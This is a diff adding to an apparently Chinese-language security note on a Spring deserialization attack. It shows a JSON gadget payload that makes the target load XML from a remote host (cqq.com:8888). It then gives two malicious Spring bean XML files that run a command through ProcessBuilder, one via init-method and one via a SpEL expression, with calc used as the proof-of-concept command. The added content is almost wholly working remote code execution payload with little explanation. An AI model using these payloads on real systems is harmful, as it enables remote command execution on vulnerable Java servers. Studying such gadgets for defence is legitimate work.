@@ -27,3 +27,20 @@
 ```json
 ["org.springframework.context.support.FileSystemXmlApplicationContext", "http://cqq.com:8888/spel3.xml"]
 ```
+其中spel3.xml内容为：
+```xml
+<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+     <constructor-arg value="calc" />
+  </bean>
+</beans>
+```
+或者这样都可以：
+```xml
+<beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+  <bean id="pb" class="java.lang.ProcessBuilder">
+     <constructor-arg value="calc.exe" />
+     <property name="whatever" value="#{ pb.start() }"/>
+  </bean>
+</beans>
+```
